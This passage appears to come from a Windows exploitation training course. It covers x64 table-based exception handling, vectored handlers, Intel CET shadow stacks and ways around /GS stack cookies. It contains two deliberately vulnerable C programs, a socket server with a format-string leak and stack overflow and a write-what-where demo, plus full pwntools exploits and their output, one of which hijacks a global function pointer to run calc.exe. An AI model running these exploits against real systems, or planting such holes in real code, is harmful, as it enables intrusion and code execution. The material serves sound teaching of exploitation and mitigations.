> **On x64**: This is NOT an SEH chain overwrite (impossible on x64). Instead, it's a
> data-only attack where the exception mechanism happens to skip past the cookie check,
> giving the attacker a window to exploit corrupted data.
>
> **CET**: Completely irrelevant here. No control flow is hijacked — the exception
> mechanism works normally. The attacker only corrupted a data variable (`is_admin`).

### x64 Exception Handling Deep Dive

On x64 Windows, exception handling is fundamentally different from x86.
Understanding this is crucial since SafeSEH and SEH exploits don't apply.

#### Table-Based Exception Handling

```c
// x64 uses table-based unwinding stored in PE headers
// No SEH chain on stack = no SEH overwrites!

// .pdata section contains RUNTIME_FUNCTION entries:
typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;      // RVA of function start
    DWORD EndAddress;        // RVA of function end
    DWORD UnwindData;        // RVA of UNWIND_INFO
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

// UNWIND_INFO describes how to unwind the function:
typedef struct _UNWIND_INFO {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
    // Followed by optional exception handler info
} UNWIND_INFO, *PUNWIND_INFO;
```

**Examining .pdata in WinDbg**:

```bash
# Dump RUNTIME_FUNCTION entries
!dh -f myapp  # Show headers
lm m myapp    # Get base address

# Find .pdata section
!dh myapp -s
# Look for .pdata section

# Dump some RUNTIME_FUNCTION entries
dps myapp+<pdata_rva> L20

# Examine specific function's unwind info
.fnent myapp!vulnerable_function
# Shows: BeginAddress, EndAddress, UnwindInfoAddress
# And the actual unwind operations
```

**Why x64 Is More Secure**:

```text
x86 SEH:
- Chain of handlers on STACK
- Attacker controls stack -> controls handlers
- Classic exploitation technique

x64 Table-based:
- Handler info in READ-ONLY .pdata section
- Cannot overwrite via buffer overflow
- Exception handling doesn't read attacker-controlled data

Result: Classic SEH overwrite impossible on x64
```

#### Vectored Exception Handlers (VEH)

VEH is an alternative that exists on both x86 and x64:

```c
// VEH registration (application can add custom handlers)
PVOID WINAPI AddVectoredExceptionHandler(
    ULONG First,                          // 1 = first handler, 0 = last
    PVECTORED_EXCEPTION_HANDLER Handler   // Callback function
);

// VEH handlers stored in ntdll:
// - LdrpVectorHandlerList (doubly linked list in heap)
// - If attacker can corrupt heap -> corrupt VEH list
// - But... heap has its own protections now
```

**VEH Internal Structure**:

```c
// Internal VEH entry structure (undocumented)
typedef struct _VECTORED_HANDLER_ENTRY {
    LIST_ENTRY List;                       // Forward/backward links
    PVOID      Unknown1;                   // Reserved
    ULONG      Refs;                       // Reference count
    PVECTORED_EXCEPTION_HANDLER Handler;   // The actual handler!
} VECTORED_HANDLER_ENTRY;

// Located via:
// ntdll!LdrpVectorHandlerList
// ntdll!RtlpCallVectoredHandlers
```

**WinDbg VEH Analysis**:

```bash
# Find VEH list
x ntdll!LdrpVectorHandlerList
dps ntdll!LdrpVectorHandlerList L4

# Each entry points to VECTORED_HANDLER_ENTRY
# Handler offset is +0x18 on x64

dt ntdll!_LIST_ENTRY poi(ntdll!LdrpVectorHandlerList)
```

### Intel CET Shadow Stack

Intel Control-flow Enforcement Technology provides **hardware-backed** return address protection,
making stack cookie bypasses significantly harder.

#### How Shadow Stack Works

```text
Normal Stack (writable):          Shadow Stack (read-only to user):
┌─────────────────────┐           ┌─────────────────────┐
│   Local Variables   │           │                     │
├─────────────────────┤           │                     │
│   Saved RBP         │           │                     │
├─────────────────────┤           ├─────────────────────┤
│   Return Address    │ --------> │   Return Address    │
└─────────────────────┘           └─────────────────────┘

CALL instruction:
  1. Pushes return address to normal stack
  2. Pushes return address to shadow stack

RET instruction:
  1. Pops return address from normal stack
  2. Pops return address from shadow stack (SSP)
  3. If they don't match -> #CP (Control Protection) exception
  4. Process terminated
```

#### CET Instructions

```asm
; New instructions for shadow stack

INCSSP reg    ; Increment shadow stack pointer (adjust SSP)
RDSSP  reg    ; Read shadow stack pointer into register
SAVEPREVSSP   ; Save previous SSP (for context switches)
RSTORSSP mem  ; Restore SSP from memory
WRSS   mem,reg; Write to shadow stack (privileged/restricted)
WRUSS  mem,reg; Write to user shadow stack (ring 3, restricted)

; These are highly restricted - user code can't freely modify shadow stack
```

#### CET-Aware Code

```c
// Check if CET is enabled
#include <intrin.h>

BOOL IsCETEnabled() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 7);

    // CET_SS (Shadow Stack) is bit 7 of ECX from CPUID leaf 7
    return (cpuInfo[2] & (1 << 7)) != 0;
}

// Check process CET status
#include <windows.h>

BOOL IsProcessCETEnabled() {
    PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY policy = {0};

    if (GetProcessMitigationPolicy(
            GetCurrentProcess(),
            ProcessUserShadowStackPolicy,
            &policy,
            sizeof(policy))) {
        return policy.EnableUserShadowStack;
    }
    return FALSE;
}
```

**Enabling CET for Your Process**:

```c
// Enable CET at process creation
STARTUPINFOEX si = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON;
UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
    &policy,
    sizeof(policy),
    NULL,
    NULL
);

CreateProcess(..., &si, ...);
```

#### CET Bypass Considerations

```text
With CET Shadow Stack, classic ROP is BLOCKED (not just harder):

- Return address overwrite -> shadow stack mismatch -> process terminated
- Classic ROP chains are impossible (every RET is validated)
- __fastfail triggers STATUS_BREAKPOINT (0x80000003) via int 0x29
- No user-mode recovery — kernel kills the process immediately

What still works (proven in Techniques 1-4 above):
+ Struct-based function pointer overwrites (indirect CALL, not RET)
+ Data-only attacks (corrupt security flags, not code pointers)
+ Exception-based bypasses (skip cookie check via __except)
+ JOP (Jump-Oriented Programming) — doesn't use RET
+ COP (Call-Oriented Programming) — uses CALL, not RET

What does NOT help against data-only attacks:
- CET shadow stack (only protects RET, not indirect CALL)
- CFG coarse-grained check (allows redirect between valid functions)
- /GS cookies (struct members aren't reordered)
```

**CET + IBT (Indirect Branch Tracking)**:

```text
Full CET includes IBT (Indirect Branch Tracking):
- Indirect CALL/JMP must land on ENDBR64 instruction
- Prevents arbitrary indirect jumps to mid-function locations
- Further restricts JOP/COP attacks

ENDBR64 instruction:
- Marks valid indirect branch targets
- Compiler inserts at function entries
- Gadgets that don't start with ENDBR64 are invalid

Windows IBT status:
- Windows 11 supports CET shadow stacks (User Shadow Stacks)
- IBT enforcement is not yet widely enabled on Windows userspace
- Linux has enabled IBT on kernel (since 5.18) and can enforce on userspace
- When IBT is enabled, it provides similar protection to CFG for indirect calls
  but at the hardware level with ENDBR64 validation
```

### Exploitation Scenarios

#### Scenario 1: Multi-Stage Cookie Leak and Data-Only Attack

Exploit chain for a vulnerable server. This demonstrates the
full attack flow: format string leak -> identify cookie/pointers -> exploit.

**Vulnerable Server (Full Example)**:

```c
// realworld_server.c - More realistic vulnerable server
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 31337
#define MAX_CLIENTS 10

typedef struct {
    char username[64];
    char session_token[32];
    int privilege_level;
} Session;

typedef struct {
    char command[16];
    char args[128];
    char padding[64];
} Request;

// Global session storage
Session* active_sessions[MAX_CLIENTS];

// Log function with format string vulnerability
// BUG: sends formatted output back to client, leaking stack values
void log_message(SOCKET client, const char* format, ...) {
    char buffer[512];
    va_list args;
    va_start(args, format);
    _vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    buffer[sizeof(buffer) - 1] = '\0';
    printf("[LOG] %s\n", buffer);
    // BUG: sends raw formatted output to client (attacker sees leaked values!)
    send(client, buffer, (int)strlen(buffer), 0);
    send(client, "\n", 1, 0);
}

// Vulnerable: Format string in logging
void handle_login(SOCKET client, char* data) {
    char response[256];
    char username[64];

    // Parse username for display
    strncpy(username, data, 63);
    username[63] = '\0';

    // VULNERABILITY: Format string leak — attacker-controlled format!
    // Uses raw 'data' (up to ~500 bytes from recv_buffer), NOT truncated
    // username. This gives the attacker enough room for many %p specifiers
    // to reach return addresses and code pointers deep in the stack.
    // With username[64], only ~21 specifiers fit — not enough.
    // With raw data (~500 bytes), ~166 specifiers fit — reaches everything.
    log_message(client, data);  // Leaks stack values to attacker!

    // Send response (uses safe truncated copy)
    _snprintf(response, sizeof(response),
             "Login attempt for: %s\n", username);
    response[sizeof(response) - 1] = '\0';
    send(client, response, (int)strlen(response), 0);
}

// Vulnerable: Stack buffer overflow
void handle_execute(SOCKET client, Request* req) {
    char local_buffer[64];  // Small buffer
    char response[256];

    // VULNERABILITY: Copies 128-byte args into 64-byte buffer
    strcpy(local_buffer, req->args);  // OVERFLOW!

    // Process and respond
    snprintf(response, sizeof(response),
             "Executed: %s with args: %s\n",
             req->command, local_buffer);
    send(client, response, strlen(response), 0);
}

void handle_client(SOCKET client) {
    char recv_buffer[512];
    int bytes;
    Request req = {0};

    // Receive command
    bytes = recv(client, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes <= 0) return;
    recv_buffer[bytes] = '\0';

    // Parse request
    if (strncmp(recv_buffer, "LOGIN ", 6) == 0) {
        handle_login(client, recv_buffer + 6);
    }
    else if (strncmp(recv_buffer, "EXEC ", 5) == 0) {
        // Parse EXEC command
        char* space = strchr(recv_buffer + 5, ' ');
        if (space) {
            *space = '\0';
            strncpy(req.command, recv_buffer + 5, 15);
            strncpy(req.args, space + 1, 127);
            handle_execute(client, &req);
        }
    }
    else {
        send(client, "Unknown command\n", 16, 0);
    }
}

int main() {
    WSADATA wsa;
    SOCKET server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);

    WSAStartup(MAKEWORD(2, 2), &wsa);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, MAX_CLIENTS);

    printf("[*] Server listening on port %d\n", PORT);
    printf("[*] log_message     @ %p\n", (void*)log_message);
    printf("[*] handle_login    @ %p\n", (void*)handle_login);
    printf("[*] handle_execute  @ %p\n", (void*)handle_execute);
    printf("[*] Mitigations: /GS enabled, ASLR enabled\n");
    fflush(stdout);

    while(1) {
        client_sock = accept(server_sock,
                            (struct sockaddr*)&client_addr,
                            &client_len);
        printf("[+] Client connected\n");
        handle_client(client_sock);
        closesocket(client_sock);
        printf("[-] Client disconnected\n");
    }

    return 0;
}
```

**Pwntools Exploit**:

```python
#!/usr/bin/env python3
"""
Full Exploit: Stack Cookie Bypass via Information Leak
Target: realworld_server.exe
Chain: Format String Leak -> Cookie/ASLR Bypass -> Struct Function Pointer Attack

This demonstrates a complete exploitation workflow.

IMPORTANT:
  - MSVCRT does NOT support positional format strings (%N$x).
    We use sequential %p specifiers instead.
  - MSVCRT %p prints bare hex (e.g., 000000000014FA48), not 0x-prefixed.
  - On CET-enabled systems, the ROP chain in Stage 3 is BLOCKED.
    Use data-only / struct-based attacks (Techniques 1-4) instead.
"""

from pwn import *
import re
import sys

# ================== Configuration ==================
TARGET_HOST = "127.0.0.1"  # Change to target
TARGET_PORT = 31337

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'

# ================== Helper Functions ==================

def connect():
    """Establish connection to target"""
    return remote(TARGET_HOST, TARGET_PORT)

def leak_stack_values(num_pads):
    """
    Use format string to leak stack values.
    MSVCRT doesn't support positional %N$p — we must use sequential %p.
    MSVCRT %p prints bare hex without 0x prefix.
    """
    r = connect()

    # Build format string with sequential %p specifiers
    # Each %p leaks one pointer-sized value from the stack
    payload = b"LOGIN " + b"%p." * num_pads
    r.send(payload)

    try:
        response = r.recvuntil(b"Login attempt", timeout=3)
    except:
        response = r.recv(timeout=2)

    r.close()

    # Parse bare-hex values from response (MSVCRT format: 000000000014FA48)
    # Also handle 0x-prefixed and (null) / 0000000000000000
    values = re.findall(rb'([0-9A-Fa-f]{8,16})', response)
    leaks = {}
    for i, val_bytes in enumerate(values):
        try:
            val = int(val_bytes, 16)
            leaks[i] = val
            log.debug(f"Offset {i}: 0x{val:016X}")
        except ValueError:
            pass

    return leaks

def identify_values(leaks):
    """
    Analyze leaked values to identify:
    - Stack cookie (XOR'd with RBP — high entropy, not a valid address)
    - Code pointers (in image range, e.g., 0x140XXXXXX with /FIXED)
    - Stack addresses (user-mode VA range)
    """
    identified = {
        'cookie': None,
        'code_ptrs': [],
        'stack_ptrs': []
    }

    for offset, val in leaks.items():
        if val == 0:
            continue

        # Image base pointers (with /FIXED, typically 0x140XXXXXX)
        if 0x140000000 <= val <= 0x14FFFFFFF:
            identified['code_ptrs'].append((offset, val))
            log.info(f"Code pointer at offset {offset}: 0x{val:016X}")

        # With ASLR: code pointers in 0x7ff6-0x7fff range
        elif 0x7ff600000000 <= val <= 0x7fffffffffff:
            identified['code_ptrs'].append((offset, val))
            log.info(f"ASLR code pointer at offset {offset}: 0x{val:016X}")

        # Stack addresses: typically high user-mode VA
        elif 0x0000000100000 <= val <= 0x00007fffffffffff and \
             not (0x7ff000000000 <= val <= 0x7fffffffffff) and \
             not (0x140000000 <= val <= 0x14FFFFFFF):
            identified['stack_ptrs'].append((offset, val))
            log.debug(f"Stack pointer at offset {offset}: 0x{val:016X}")

        # Cookie candidate: high entropy, not a valid address
        # The XOR'd cookie typically doesn't look like any address range
        elif val > 0xFFFF:
            if identified['cookie'] is None:
                identified['cookie'] = (offset, val)
                log.success(f"Potential cookie at offset {offset}: 0x{val:016X}")

    return identified

def exploit():
    """Main exploitation function"""

    log.info("=" * 50)
    log.info("Stack Cookie Bypass — Information Leak")
    log.info("=" * 50)

    # ============ Stage 1: Information Leak ============
    log.info("Stage 1: Leaking stack values via format string")
    log.info("Using sequential %%p (MSVCRT has no positional %%N$p)")

    leaks = leak_stack_values(80)  # Leak 80 stack values (needs raw data path)
    log.info(f"Leaked {len(leaks)} values from stack")

    identified = identify_values(leaks)

    if identified['cookie'] is None:
        log.error("Failed to identify stack cookie!")
        return False

    cookie_offset, cookie_value = identified['cookie']
    log.success(f"Cookie: 0x{cookie_value:016X} at offset {cookie_offset}")

    if identified['code_ptrs']:
        code_offset, code_ptr = identified['code_ptrs'][0]
        log.success(f"Code pointer: 0x{code_ptr:016X} at offset {code_offset}")
        # With ASLR, calculate base address:
        # The leaked pointer is somewhere inside the binary.
        # Page-align down to estimate the module base.
        # In a real exploit, you'd know the exact offset from RE.
        estimated_base = code_ptr & 0xFFFFFFFFFFFF0000  # 64KB aligned (ASLR granularity)
        log.info(f"Estimated module base: 0x{estimated_base:016X}")
        log.info(f"Offset in module: 0x{code_ptr - estimated_base:X}")
    else:
        log.warning("No code pointers leaked — try increasing num_pads")

    # ============ Stage 2: Exploitation ============
    log.info("Stage 2: Exploitation")
    log.info("")
    log.warning("=" * 50)
    log.warning("CET CHECK: On Windows 11 with CET shadow stacks,")
    log.warning("classic ROP (return address overwrite) is BLOCKED.")
    log.warning("The shadow stack maintains a separate copy of return")
    log.warning("addresses that the attacker cannot modify.")
    log.warning("")
    log.warning("For CET-enabled targets, use data-only attacks:")
    log.warning("  - Struct function pointer overwrite (Techniques 1-3)")
    log.warning("  - Exception-based data corruption (Technique 4)")
    log.warning("  - Write-What-Where to global function pointers")
    log.warning("=" * 50)

    # --- Conceptual ROP chain (for non-CET systems only) ---
    # On systems WITHOUT CET, the cookie leak enables classic ROP:
    #
    # handle_execute stack layout (approximate):
    # [local_buffer 64][cookie 8][saved_rbp 8][return_addr 8]
    #
    # payload = b"EXEC cmd "
    # payload += b"A" * 64                   # Fill local_buffer
    # payload += p64(cookie_value)            # Correct cookie!
    # payload += p64(0xdeadbeef)              # Saved RBP
    # payload += rop_chain                    # ROP chain at return
    #
    # But on CET: shadow stack mismatch -> process killed.

    log.success("Leak complete. Cookie and code pointers recovered.")
    log.info("On non-CET systems: build ROP chain with leaked cookie.")
    log.info("On CET systems: use struct-based attacks from Techniques 1-4.")

    return True

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_HOST = sys.argv[1]
    if len(sys.argv) > 2:
        TARGET_PORT = int(sys.argv[2])

    exploit()
```

```bash
# build inside C:\Windows_Mitigations_Lab
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\realworld_server.c /Fe:bin\realworld_server.exe /link ws2_32.lib /DEBUG /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
# in one terminal:
.\bin\realworld_server.exe
# in another
python exploits\realworld.py
# TODO: complete the exploit using one of the methods explained earlier in this day
```

#### Scenario 2: Write-What-Where Without Cookie Corruption

Exploiting vulnerable write primitives that don't touch the cookie.

```c
// www_vuln.c - Write-What-Where vulnerability
// Demonstrates: binary protocol deserialization into struct with unvalidated
// fields, enabling arbitrary write to a global function pointer.
//
// The struct fields (index, value, target) are directly controlled by
// attacker input. process_write() does: *target = value (Write-What-Where).
// The stack cookie is NEVER corrupted — the write targets a GLOBAL pointer.
//
// Key difference from Techniques 1-3: those corrupt struct function pointers
// on the STACK. This corrupts a GLOBAL function pointer via an arbitrary
// write primitive. /GS protects neither.

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stddef.h>

typedef struct {
    char name[32];       // offset 0  - attacker label/command
    int index;           // offset 32 - array index (fallback path)
    int value;           // offset 36 - WHAT to write (low 32 bits)
    int* target;         // offset 40 - WHERE to write (pointer)
} WriteRequest;          // total: 48 bytes

// Array of allowed values
int allowed_values[10] = {0};

void process_write(WriteRequest* req) {
    // VULNERABILITY: No validation of target pointer or value!
    // Attacker controls both WHAT and WHERE.
    if (req->target != NULL) {
        printf("[*] Writing value 0x%X to address %p\n",
               req->value, (void*)req->target);
        *req->target = req->value;  // Write-What-Where!
    } else {
        // Fallback: write to allowed_values array
        // VULNERABILITY: No bounds check on index!
        printf("[*] Writing value %d to allowed_values[%d]\n",
               req->value, req->index);
        allowed_values[req->index] = req->value;  // OOB write!
    }

    printf("[*] Write completed\n");
}

// Function pointer that will be our target
void (*cleanup_handler)(void) = NULL;

void safe_cleanup() {
    printf("[*] Safe cleanup running\n");
}

void dangerous_action() {
    printf("[!] PWNED! Running dangerous action!\n");
    system("calc.exe");
}

int main() {
    WriteRequest req = {0};
    size_t n;

    cleanup_handler = safe_cleanup;

    // Print addresses for exploit auto-parsing
    printf("=== Write-What-Where Demo ===\n");
    printf("safe_cleanup      @ %p\n", (void*)safe_cleanup);
    printf("dangerous_action  @ %p\n", (void*)dangerous_action);
    printf("cleanup_handler   @ %p (global func ptr)\n", (void*)&cleanup_handler);
    printf("cleanup_handler   = %p (currently points to safe_cleanup)\n",
           (void*)cleanup_handler);
    printf("struct size: %zu bytes\n", sizeof(WriteRequest));
    printf("  name[32]  @ offset %zu\n", offsetof(WriteRequest, name));
    printf("  index     @ offset %zu\n", offsetof(WriteRequest, index));
    printf("  value     @ offset %zu\n", offsetof(WriteRequest, value));
    printf("  target    @ offset %zu\n", offsetof(WriteRequest, target));
    fflush(stdout);

    // Read binary request (simulates a binary protocol/deserialization)
    // fread does NOT add \0 or stop at newline — reads exact binary data.
    // The attacker controls ALL struct fields: name, index, value, target.
    // No overflow past the struct = cookie is NOT corrupted.
    printf("\nWaiting for %zu bytes of binary input...\n", sizeof(req));
    fflush(stdout);
    n = fread(&req, 1, sizeof(req), stdin);
    printf("[*] Read %zu bytes\n", n);

    // Show what the attacker sent
    printf("[*] name:   '%.32s'\n", req.name);
    printf("[*] index:  %d\n", req.index);
    printf("[*] value:  0x%X\n", req.value);
    printf("[*] target: %p\n", (void*)req.target);
    fflush(stdout);

    process_write(&req);

    // Later... cleanup_handler has been overwritten!
    printf("[*] Calling cleanup_handler (%p)...\n",
           (void*)cleanup_handler);
    fflush(stdout);
    if (cleanup_handler) {
        cleanup_handler();  // Calls dangerous_action!
    }

    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\www_vuln.c
# Compile with /GS to show that cookie doesn't protect this attack vector
# /FIXED = no ASLR (deterministic addresses for the exploit)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\www_vuln.c /Fe:bin\www_vuln.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# This exploits a Write-What-Where primitive that bypasses stack cookies entirely
# The attack targets a global function pointer, not the return address
# Cookie is NEVER corrupted — fread reads exactly sizeof(struct) bytes
```

**Pwntools WWW Exploit**:

```python
#!/usr/bin/env python3
"""
exploits/sc_www.py
Write-What-Where Exploit — Bypasses /GS without corrupting the cookie!

The vulnerable C code uses fread(&req, 1, sizeof(req), stdin) to read
a binary request directly into a WriteRequest struct. The attacker
controls ALL struct fields, including the 'target' pointer and 'value'.

process_write() does: *target = value (Write-What-Where).
We set target = &cleanup_handler and value = low 32 bits of
dangerous_action's address. This overwrites the global function pointer.

struct WriteRequest layout (x64):
  +0x00: name[32]    (32 bytes)
  +0x20: index       (4 bytes, int)
  +0x24: value       (4 bytes, int)  <- WHAT to write
  +0x28: target      (8 bytes, ptr)  <- WHERE to write
  Total: 48 bytes

Key insight: fread reads EXACTLY sizeof(req) = 48 bytes. No \0 appended,
no \n handling. The data goes into the struct and NOWHERE ELSE.
The stack cookie (placed after the struct) is never touched.

With /FIXED: all addresses share upper bytes (0x00000001). process_write
does a 4-byte int write, so overwriting just the low dword of
cleanup_handler is enough — upper bytes remain correct.

Addresses are auto-parsed from the binary's runtime output.

Works on Windows 11 + CET: no return address hijacking.
This is a global function pointer write, not a struct member attack.

Usage:
  python exploits\\sc_www.py
"""

from pwn import *
import re

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse an address from binary output like:
      dangerous_action  @ 00000001400043C7
    Handles both bare-hex (MSVCRT) and 0x-prefixed formats.
    """
    patterns = [
        re.compile(label.encode() + rb'\s+@\s+([0-9A-Fa-f]{8,16})'),
        re.compile(label.encode() + rb'\s*=\s*([0-9A-Fa-f]{8,16})'),
        re.compile(label.encode() + rb'\s+@\s+0x([0-9A-Fa-f]+)'),
    ]
    for pat in patterns:
        m = pat.search(output_bytes)
        if m:
            return int(m.group(1), 16)
    return None


def exploit():
    binary_path = r'C:\Windows_Mitigations_Lab\bin\www_vuln.exe'

    # Phase 1: Run binary to discover addresses from startup output
    log.info("Phase 1: discovering addresses from binary output...")
    p = process([binary_path])

    # Binary prints addresses, then waits for binary input
    try:
        startup = p.recvuntil(b"binary input...", timeout=5)
    except:
        startup = p.recv(timeout=3)

    decoded = startup.decode(errors='replace')
    log.info(f"Startup output:\n{decoded}")

    # Parse addresses
    DANGEROUS_ACTION = parse_address(startup, 'dangerous_action')
    # cleanup_handler appears twice: "@ addr (global func ptr)" and "= addr (currently...)"
    # We want the ADDRESS OF the variable (the one with "global func ptr")
    m = re.search(rb'cleanup_handler\s+@\s+([0-9A-Fa-f]{8,16})\s+\(global', startup)
    if m:
        CLEANUP_HANDLER_PTR = int(m.group(1), 16)
    else:
        CLEANUP_HANDLER_PTR = parse_address(startup, 'cleanup_handler')

    if DANGEROUS_ACTION is None or CLEANUP_HANDLER_PTR is None:
        log.error("Failed to parse addresses from binary output!")
        log.error("Expected: 'dangerous_action  @ ADDR' and 'cleanup_handler   @ ADDR (global func ptr)'")
        p.close()
        return

    log.success(f"dangerous_action  = 0x{DANGEROUS_ACTION:016X}")
    log.success(f"cleanup_handler   @ 0x{CLEANUP_HANDLER_PTR:016X} (address of global variable)")

    # Phase 2: Build Write-What-Where payload
    log.info("Phase 2: building WWW payload...")

    # struct WriteRequest layout:
    #   name[32]  @ +0x00  (label/command string)
    #   index     @ +0x20  (4 bytes — not used when target is non-NULL)
    #   value     @ +0x24  (4 bytes — WHAT to write: low 32 bits of dangerous_action)
    #   target    @ +0x28  (8 bytes — WHERE to write: &cleanup_handler)
    #
    # process_write() does: *(int*)target = value
    # This overwrites the low 4 bytes of cleanup_handler.
    # Since both functions share upper bytes 0x00000001 (compiled with /FIXED),
    # the full 8-byte pointer now correctly points to dangerous_action.

    payload = b"calc.exe\x00"                                    # name (command for later)
    payload += b"A" * (32 - len(payload))                        # pad name to 32 bytes
    payload += p32(0)                                            # index (unused)
    payload += p32(DANGEROUS_ACTION & 0xFFFFFFFF)                # value: low 32 bits
    payload += p64(CLEANUP_HANDLER_PTR)                          # target: &cleanup_handler

    assert len(payload) == 48, f"Payload must be exactly 48 bytes, got {len(payload)}"

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..31]   name: 'calc.exe' + padding")
    log.info(f"  [32..35]  index: 0 (unused — target is non-NULL)")
    log.info(f"  [36..39]  value: 0x{DANGEROUS_ACTION & 0xFFFFFFFF:08X} (low dword of dangerous_action)")
    log.info(f"  [40..47]  target: 0x{CLEANUP_HANDLER_PTR:016X} (&cleanup_handler)")

    # Send exactly 48 bytes — fread reads sizeof(req) = 48, no \n needed
    p.send(payload)

    try:
        output = p.recvall(timeout=5)
        decoded = output.decode(errors='replace')
        log.info(f"Output:\n{decoded}")

        if "PWNED" in decoded or "dangerous" in decoded.lower():
            log.success("Write-What-Where exploit worked!")
            log.success("cleanup_handler overwritten with dangerous_action")
            log.success("/GS cookie was NEVER corrupted — bypass complete")
        elif "Safe cleanup" in decoded:
            log.failure("cleanup_handler was NOT overwritten")
            log.failure("Check address parsing — compare with startup output")
    except:
        pass

    try:
        p.wait(timeout=5)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        if exit_code == 0:
            log.success(f"Clean exit (0x0) — cookie was never corrupted")
        elif exit_code == 0xc0000409:
            log.failure(f"Cookie corruption detected (0xc0000409)")
            log.failure("This should NOT happen with fread-based input")
        else:
            log.info(f"Exit code: {hex(exit_code)}")

    p.close()


if __name__ == "__main__":
    exploit()
```

**Expected Results**:

```bash
c:\Windows_Mitigations_Lab> python exploits\sc_www.py
#[*] Phase 1: discovering addresses from binary output...
#[x] Starting local process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe'
#[+] Starting local process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe': pid 10640
#[*] Startup output:
#    === Write-What-Where Demo ===
#    safe_cleanup      @ 00000001400020F4
#    dangerous_action  @ 0000000140001E33
#    cleanup_handler   @ 00000001400A4568 (global func ptr)
#    cleanup_handler   = 00000001400020F4 (currently points to safe_cleanup)
#    struct size: 48 bytes
#      name[32]  @ offset 0
#      index     @ offset 32
#      value     @ offset 36
#      target    @ offset 40

#    Waiting for 48 bytes of binary input...
#[+] dangerous_action  = 0x0000000140001E33
#[+] cleanup_handler   @ 0x00000001400A4568 (address of global variable)
#[*] Phase 2: building WWW payload...
#[*] Payload (48 bytes):
#[*]   [0..31]   name: 'calc.exe' + padding
#[*]   [32..35]  index: 0 (unused — target is non-NULL)
#[*]   [36..39]  value: 0x40001E33 (low dword of dangerous_action)
#[*]   [40..47]  target: 0x00000001400A4568 (&cleanup_handler)
#[x] Receiving all data
#[x] Receiving all data: 2B
#[x] Receiving all data: 282B
#[*] Process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe' stopped with exit code 0 (pid 10640)
#[+] Receiving all data: Done (282B)
#[*] Output:

#    [*] Read 48 bytes
#    [*] name:   'calc.exe'
#    [*] index:  0
#    [*] value:  0x40001E33
#    [*] target: 00000001400A4568
#    [*] Writing value 0x40001E33 to address 00000001400A4568
#    [*] Write completed
#    [*] Calling cleanup_handler (0000000140001E33)...
#   [!] PWNED! Running dangerous action!
#[+] Write-What-Where exploit worked!
#[+] cleanup_handler overwritten with dangerous_action
#[+] /GS cookie was NEVER corrupted — bypass complete
#[+] Clean exit (0x0) — cookie was never corrupted
```

### Practical Exercise

#### Task 1: Format String Leak — Cookie and ASLR Recovery

Demonstrate the full information leak chain against the ASLR-enabled server.

1. **Compile with ASLR** (addresses randomized every run):

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\realworld_server.c ^
      /Fe:bin\realworld_server.exe /link ws2_32.lib /DEBUG ^
      /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
   ```

2. **Start the server** and note the function addresses printed at startup:

   ```bash
   bin\realworld_server.exe
   # Output:
   #   [*] Server listening on port 31337
   #   [*] log_message     @ 00007FF6799819C9    <- randomized!
   #   [*] handle_login    @ 00007FF679984133
   #   [*] handle_execute  @ 00007FF67998348B
   #   [*] Mitigations: /GS enabled, ASLR enabled
   ```

3. **Leak stack values** via format string (MSVCRT: sequential `%p`, bare hex, no `%N$p`):

   ```bash
   # 80 specifiers × ~17 chars each = ~1360 chars, but _vsnprintf buffer is 512.
   # Result: ~30 values leaked (512/17 ≈ 30). This is realistic — real leaks
   # are always constrained by buffer sizes.
   python -c "from pwn import *; r=remote('127.0.0.1',31337); r.send(b'LOGIN ' + b'%%p.' * 80); print(r.recv(timeout=3)); r.close()"
   ```

4. **Run the full exploit** to parse and classify leaked values:

   ```bash
   python exploits\realworld.py
   # Expected output:
   #   [+] Potential cookie at offset 1: 0x8101010101010100  <- high entropy
   #   [*] ASLR code pointer at offset 27: 0x00007FF939C0F77C <- DLL address
   #   [+] Cookie: 0x8101010101010100 at offset 1
   #   [+] Code pointer: 0x00007FF939C0F77C at offset 27
   #   [*] Estimated module base: 0x00007FF939C00000  (64KB aligned)
   ```

